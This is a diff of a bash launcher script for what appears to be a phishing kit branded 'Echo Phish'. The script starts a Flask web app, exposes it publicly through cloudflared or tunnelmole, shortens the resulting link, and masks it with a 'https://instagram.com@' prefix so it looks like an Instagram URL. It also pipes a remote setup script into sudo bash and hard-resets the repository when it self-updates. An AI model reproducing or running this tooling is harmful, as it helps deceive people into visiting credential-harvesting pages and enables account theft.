@@ -10,12 +10,22 @@ RESET='\033[0m'
 
 export VERSION=2.4
 
-# Banner fonksiyonunu düzenledik
 banner() {
-    echo -e "${CYAN}Instagram MustiHamza7${RESET}${YELLOW}\n"
+    echo -e "${CYAN} _____                                                     _____ "
+    echo -e "( ___ )                                                   ( ___ )"
+    echo -e " |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | "
+    echo -e " |   |  ______     _             _____  _     _     _      |   | "
+    echo -e " |   | |  ____|   | |           |  __ \\| |   (_)   | |     |   | "
+    echo -e " |   | | |__   ___| |__   ___   | |__) | |__  _ ___| |__   |   | "
+    echo -e " |   | |  __| / __| '_ \\ / _ \\  |  ___/| '_ \\| / __| '_ \\  |   | "
+    echo -e " |   | | |___| (__| | | | (_) | | |    | | | | \\__ \\ | | | |   | "
+    echo -e " |   | |______\\___|_| |_|\\___/  |_|    |_| |_|_|___/_| |_| |   | "
+    echo -e " |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| "
+    echo -e "(_____)                                                   (_____)${RESET}${YELLOW}"
+    echo -e "           https://t.me/HXTermuxCode       V ${VERSION}\n"
+    echo -e "${RED}    "
 }
 
-# Temizlik fonksiyonu
 cleanup() {
     if pgrep -f "cloudflared" > /dev/null; then
         killall cloudflared
@@ -44,47 +54,64 @@ cleanup() {
 
 trap cleanup SIGINT
 
-# Bağımlılıkları kontrol etme
-check_dependencies() {
-    if ! cloudflared --version 2>/dev/null | grep -q '2025.1.0'; then
-        cloudflared_install
+clean_background_process(){
+    if pgrep -f "cloudflared" > /dev/null; then
+        killall cloudflared
+        echo -e "\n${YELLOW} [ ! ] Cloudflared stopped.${RESET}\n"
     fi
 
-    if ! command -v node &> /dev/null; then
-        echo -e "${RED} [ ! ] Node.js is not installed. Installing...${RESET}"
-        
-        if [ -d "/data/data/com.termux" ]; then
-            pkg update -y && pkg install -y nodejs
-        else
-            curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash - 
-            sudo apt-get install -y nodejs
-        fi
-        echo -e "${GREEN} [ + ] Node.js installed successfully.${RESET}"
+    if pgrep -f "tunnelmole" > /dev/null || pgrep -f "tmole" > /dev/null || pgrep -f "x-www-browser" > /dev/null; then
+        pkill -f "tunnelmole"
+        pkill -f "tmole"
+        pkill -f "x-www-browser"
+        echo -e "\n${YELLOW} [ ! ] Tunnelmole stopped.${RESET}\n"
     fi
 
-    if ! command -v tunnelmole &> /dev/null; then
-        echo -e "${RED} [ ! ] Tunnelmole is not installed. Installing...${RESET}"
-        
-        if [ -d "/data/data/com.termux" ]; then
-            npm install -g tunnelmole
-        else
-            sudo npm install -g tunnelmole
-        fi
-        echo -e "${GREEN} [ + ] Tunnelmole installed successfully.${RESET}"
+    if pgrep -f "gunicorn" > /dev/null; then
+        pkill -f "gunicorn"
+        echo -e "\n${YELLOW} [ ! ] Web application (gunicorn) stopped.${RESET}\n"
+        sleep 1
     fi
 
-    if ! command -v jq &> /dev/null; then
-        echo -e "${RED} [ ! ] jq is not installed. Installing...${RESET}"
-        if [ -d "/data/data/com.termux" ]; then
-            pkg update -y && pkg install -y jq
+    if [[ -n "$VIRTUAL_ENV" ]]; then
+        deactivate
+    fi
+
+}
+
+
+check_update() {
+    git fetch origin
+    clear
+    banner
+    LOCAL_COMMIT=$(git rev-parse HEAD)
+    REMOTE_COMMIT=$(git rev-parse origin/$(git rev-parse --abbrev-ref HEAD))
+
+    if [ "$LOCAL_COMMIT" != "$REMOTE_COMMIT" ]; then
+        echo -e -n "\n${YELLOW} [ ? ] A new update is available. New version: ${VERSION} . Do you want to update? (Y/N): ${RESET}"
+        read -r response
+        response=${response:-"Y"}
+
+        if [[ "$response" =~ ^[Yy][Ee][Ss]$ || "$response" =~ ^[Yy]$ ]]; then
+            echo -e "\n${YELLOW} [ ? ] Updating...\n${RESET}"
+            sleep 1
+            git reset --hard
+            git pull
+            clear
+            banner
+            echo -e "\n${GREEN} [ + ] Update completed. Restarting the script... ${RESET}\n"
+            sleep 1
+            exec bash "$BASH_SOURCE"
         else
-            sudo apt-get update -y && sudo apt-get install -y jq
+            echo -e "${RED} [ ! ] Update skipped.${RESET}\n"
+            sleep 1
         fi
-        echo -e "${GREEN} [ + ] jq installed successfully.${RESET}"
+    else
+        echo -e "\n${GREEN} [ + ] No updates available.${RESET}\n"
+        sleep 1
     fi
 }
 
-# Cloudflared kurulumu
 cloudflared_install() {
     if [ -d "/data/data/com.termux" ]; then
         if ! command -v curl &> /dev/null; then
@@ -127,7 +154,46 @@ cloudflared_install() {
     fi
 }
 
-# Python bağımlılıklarını yüklemek
+
+check_dependencies() {
+    if ! cloudflared --version 2>/dev/null | grep -q '2025.1.0'; then
+        cloudflared_install
+    fi
+
+    if ! command -v node &> /dev/null; then
+        echo -e "${RED} [ ! ] Node.js is not installed. Installing...${RESET}"
+        
+        if [ -d "/data/data/com.termux" ]; then
+            pkg update -y && pkg install -y nodejs
+        else
+            curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
+            sudo apt-get install -y nodejs
+        fi
+        echo -e "${GREEN} [ + ] Node.js installed successfully.${RESET}"
+    fi
+
+    if ! command -v tunnelmole &> /dev/null; then
+        echo -e "${RED} [ ! ] Tunnelmole is not installed. Installing...${RESET}"
+        
+        if [ -d "/data/data/com.termux" ]; then
+            npm install -g tunnelmole
+        else
+            sudo npm install -g tunnelmole
+        fi
+        echo -e "${GREEN} [ + ] Tunnelmole installed successfully.${RESET}"
+    fi
+
+    if ! command -v jq &> /dev/null; then
+        echo -e "${RED} [ ! ] jq is not installed. Installing...${RESET}"
+        if [ -d "/data/data/com.termux" ]; then
+            pkg update -y && pkg install -y jq
+        else
+            sudo apt-get update -y && sudo apt-get install -y jq
+        fi
+        echo -e "${GREEN} [ + ] jq installed successfully.${RESET}"
+    fi
+}
+
 install_python_dependencies() {
     if [ ! -f "./env/bin/activate" ]; then
         echo -e "\n${RED} [ ! ] Virtual environment not found, creating...${RESET}\n"
@@ -143,12 +209,47 @@ install_python_dependencies() {
     sleep 2
 }
 
-# Ana Menü Seçimi
+mask_url() {
+    local long_url="$1"
+    
+    echo -e "\n${GREEN} [ + ] URL shortening...${RESET}"
+    sleep 1
+    local short_url=$(short_url "$long_url")
+
+    echo -e -n "\n${YELLOW} [ ? ] Enter your custom domain (default: instagram.com): ${RESET}"
+    read -r custom_domain
+    custom_domain=${custom_domain:-"instagram.com"}
+    
+    echo -e "\n${GREEN} [ + ] URL masking...${RESET}\n"
+    local masked_url=$(echo "$short_url" | sed "s|https://|https://${custom_domain}@|")
+    sleep 3
+    clear
+    banner
+
+    echo -e "${YELLOW} \n   Masked url: "
+    echo -e "------------------------------------------------"
+    echo -e "${GREEN} [ + ] ${masked_url}${YELLOW}"
+    echo -e "------------------------------------------------"
+}
+
+short_url() {
+    local long_url="$1"
+    local api_endpoint="https://ulvis.net/API/write/post"
+    
+    local response=$(curl -s -X POST -d "url=$long_url" "$api_endpoint" 2>/dev/null)
+    if echo "$response" | jq -e '.success' >/dev/null 2>&1; then
+        echo "$(echo "$response" | jq -r '.data.url')"
+    else
+        echo "$long_url"  
+    fi
+}
+
+
 select_methode () {
     clear
     banner
 
-    echo -e "\n${YELLOW}    Select the method!${RESET}"
+    echo -e "\n${YELLOW}    Select the method!"
     echo -e "----------------------"
     echo -e "|   1-${GREEN} localhost${YELLOW}       |"
     echo -e "----------------------"
@@ -200,18 +301,60 @@ select_methode () {
             echo -e "${GREEN} [ + ] Starting the application on port $port ...${RESET}"
             gunicorn --bind 0.0.0.0:$port web_app:app 2>/dev/null &  
             sleep 1
-            cloudflared tunnel --no-autoupdate --metrics localhost:55555 --url http://127.0.0.1:$port
+            cloudflared tunnel --no-autoupdate --metrics localhost:55555 --url http://localhost:$port 2>/dev/null & 
+            echo -e "\n${GREEN} [ + ] Cloudflared starting...."
+
+            original_url=""
+            while [[ -z "$original_url" || "$original_url" == "null" ]]; do
+                original_url=$(curl -s http://localhost:55555/quicktunnel | jq -r '.hostname')
+                sleep 1 
+            done
+
+            clear
+            banner
+            echo -e "${YELLOW} \n   Original url: "
+            echo -e "------------------------------------------------"
+            echo -e "${GREEN} [ + ] https://${original_url}${YELLOW}"
+            echo -e "------------------------------------------------"
+
+            echo -e -n "\n${YELLOW} [ ? ] Do you want mask url? (Y/N): ${RESET}"
+            read -r response
+            response=${response:-"Y"}
+
+            if [[ "$response" =~ ^[Yy][Ee][Ss]$ || "$response" =~ ^[Yy]$ ]]; then
+                mask_url https://${original_url}
+            else
+                echo -e "\n${RED} [ ! ] Url masking skipped.${RESET}\n"
+            fi
             ;;
 
         3)
             echo -e "${GREEN} [ + ] Starting the application on port $port ...${RESET}"
-            gunicorn --bind 0.0.0.0:$port web_app:app 2>/dev/null &
+            gunicorn --bind 0.0.0.0:$port web_app:app 2>/dev/null &  
             sleep 1
-            tmole -p $port
+            echo -e "\n${GREEN} [ + ] Starting Tunnelmole on port $port...${RESET}"
+            sleep 2
+            clear
+            banner
+            tunnelmole $port 
+            sleep 1
             ;;
+
+        *)
+            echo -e "${RED} [ ! ] Please enter a valid number!${RESET}"
+            sleep 1
+            select_methode  
+            ;;
+
     esac
 }
 
-check_dependencies
+check_update
+clean_background_process
 install_python_dependencies
+check_dependencies
 select_methode
+
+while true; do
+    sleep 1
+done
